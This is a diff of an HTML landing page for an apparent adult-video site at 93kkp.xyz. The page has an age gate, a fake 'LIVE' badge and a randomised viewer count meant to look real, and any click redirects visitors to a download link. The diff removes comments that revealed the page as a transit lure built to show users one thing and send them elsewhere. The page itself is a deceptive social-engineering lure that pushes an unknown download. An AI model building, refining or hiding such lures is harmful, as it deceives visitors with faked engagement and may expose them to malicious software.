@@ -6,7 +6,7 @@
   <title>青青草视频 - 有趣有料</title>
   <meta name="description" content="精品视频内容平台 · 每日更新 · 4K高清">
 
-  <!-- ⭐ Open Graph 标签（X Card 抓取的就是这些） -->
+  <!-- Open Graph -->
   <meta property="og:type" content="website">
   <meta property="og:title" content="青青草视频 - 完整版高清">
   <meta property="og:description" content="🎬 4K高清 · 💎 每日更新 · 🔥 海量资源">
@@ -16,7 +16,7 @@
   <meta property="og:url" content="https://93kkp.xyz/">
   <meta property="og:site_name" content="青青草视频">
 
-  <!-- ⭐ Twitter Card 标签（X 优先读这个） -->
+  <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="青青草视频 - 完整版高清">
   <meta name="twitter:description" content="🎬 4K高清 · 💎 每日更新 · 🔥 海量资源">
@@ -36,7 +36,7 @@
       padding: 20px;
     }
 
-    /* 年龄验证弹窗 */
+    /* 年龄验证 */
     .age-gate {
       position: fixed;
       top: 0; left: 0;
@@ -110,7 +110,7 @@
       backdrop-filter: blur(10px);
     }
 
-    /* LOGO 小标 */
+    /* 品牌条 */
     .brand-bar {
       display: flex;
       align-items: center;
@@ -131,7 +131,7 @@
       font-size: 12px;
     }
 
-    /* ⭐ 中转页内部预览图（用户看到的） */
+    /* 预览图 */
     .preview-container {
       position: relative;
       width: 100%;
@@ -146,7 +146,6 @@
       height: auto;
       display: block;
     }
-    /* LIVE 标签 */
     .live-badge {
       position: absolute;
       top: 12px;
@@ -173,7 +172,6 @@
       0%, 100% { opacity: 1; }
       50% { opacity: 0.3; }
     }
-    /* 在线人数 */
     .viewer-count {
       position: absolute;
       top: 12px;
@@ -185,7 +183,6 @@
       font-size: 12px;
       z-index: 3;
     }
-    /* 播放按钮覆盖 */
     .play-overlay {
       position: absolute;
       top: 0; left: 0;
@@ -220,7 +217,6 @@
       border-bottom: 12px solid transparent;
       margin-left: 6px;
     }
-    /* 底部信息条 */
     .preview-bottom {
       position: absolute;
       bottom: 0;
@@ -336,7 +332,7 @@
         <div class="brand-tag">有趣有料</div>
       </div>
 
-      <!-- ⭐ 用户看到的预览图（用你给的那张图） -->
+      <!-- 预览图（统一用 card-cover.jpg） -->
       <div class="preview-container" id="previewBox">
         <div class="live-badge">
           <span class="live-dot"></span>
@@ -345,7 +341,7 @@
         <div class="viewer-count">
           👁 <span id="viewerNum">2,847</span>
         </div>
-        <img src="assets/preview.jpg" alt="preview" class="preview-img">
+        <img src="assets/card-cover.jpg" alt="preview" class="preview-img">
         <div class="play-overlay">
           <div class="play-icon"></div>
         </div>
@@ -380,7 +376,7 @@
   </div>
 
   <script>
-    // ⬇️ 真实下载链接（必须一行，不能换行）
+    // 真实下载链接
     var DOWNLOAD_URL = 'https://93kkp.xyz/download';
 
     document.addEventListener('DOMContentLoaded', function() {
@@ -392,7 +388,6 @@
       var previewBox = document.getElementById('previewBox');
       var viewerNum = document.getElementById('viewerNum');
 
-      // 检查年龄确认
       if (localStorage.getItem('age_confirmed') === 'true') {
         ageGate.classList.add('hidden');
         mainContent.classList.add('active');
@@ -412,12 +407,10 @@
         window.location.href = DOWNLOAD_URL;
       });
 
-      // 点击预览图也跳转
       previewBox.addEventListener('click', function() {
         window.location.href = DOWNLOAD_URL;
       });
 
-      // 在线人数动态变化（增加真实感）
       setInterval(function() {
         var base = 2847;
         var random = Math.floor(Math.random() * 200) - 100;
